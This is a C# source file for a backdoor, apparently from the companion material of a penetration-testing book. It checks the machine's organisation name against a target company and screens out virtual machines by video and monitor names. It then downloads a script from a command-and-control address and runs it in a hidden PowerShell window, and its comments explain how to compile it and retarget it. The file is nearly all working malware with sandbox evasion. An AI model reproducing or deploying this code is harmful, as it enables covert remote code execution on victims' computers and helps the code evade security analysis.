using System;
using System.Management;
using Microsoft.Build.Framework;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net;
using System.Reflection;

/*
  Compile using the following command : 
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /out:hello.exe /reference:Microsoft.Build.Framework.dll .\ps_backdoor.cs
  
  Remember to change condition element sin Valid_Environment and Custom_shape_ui methods to execute it in a random environment.
  Full code detail available in How to Hack Like a Legend book.
  
  Sparc Flow
*/
namespace backdoor2
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check if running inside a VM
            if (Valid_environment())
            {
                Custom_shape_ui();
            }
            else
                Console.WriteLine("norun");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();

        }

        static private void Custom_shape_ui()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\UEV\\Agent");
            //If key is present, the backdoor exits (arbitrary kill switch when normal persistence is achieved)
            if (key != null)
            {
                if (key.GetValue("Version") == null)
                {
                    //Start real backdoor logic
                    Custom_shape_ui_launcher();

                }
            }

        }
        static private void Custom_shape_ui_launcher()
        {

            //Download encoded script from C2
            System.Net.WebRequest.DefaultWebProxy.Credentials = System.Net.CredentialCache.DefaultNetworkCredentials;
            WebClient myWebClient = new WebClient();
            string mystring = myWebClient.DownloadString("http://10.62.144.17/script2.txt");
            //Launch PS
            var p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.Arguments = mystring;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
        }
        static private bool Valid_environment()
        {
            //Only run this script on a computer belonging to G&S Trust
            ManagementObjectSearcher search = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
            foreach (ManagementObject obj in search.Get())
            {
                string name = obj["Organization"].ToString().Trim().ToLower();
                // Change this condition result to make it run on your workstation
                if (!name.StartsWith("gs") || !name.StartsWith("g&s") || !name.StartsWith("trus"))
                    return false;

            }
            search = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
            foreach (ManagementObject obj in search.Get())
            {
                string name = obj["Name"].ToString().Trim().ToLower();
                if (name.Contains("vmw") || name.Contains("box") || name.Contains("basic") || name.Contains("adapter"))
                    return false;
            }
            search = new ManagementObjectSearcher("SELECT * FROM Win32_DesktopMonitor");
            foreach (ManagementObject obj in search.Get())
            {
                string manu = obj["MonitorManufacturer"].ToString().Trim().ToLower();
                if (manu.Contains("standard") || manu.Contains("types") || manu == "")
                    return false;

            }
            return true;
        }
    }
}
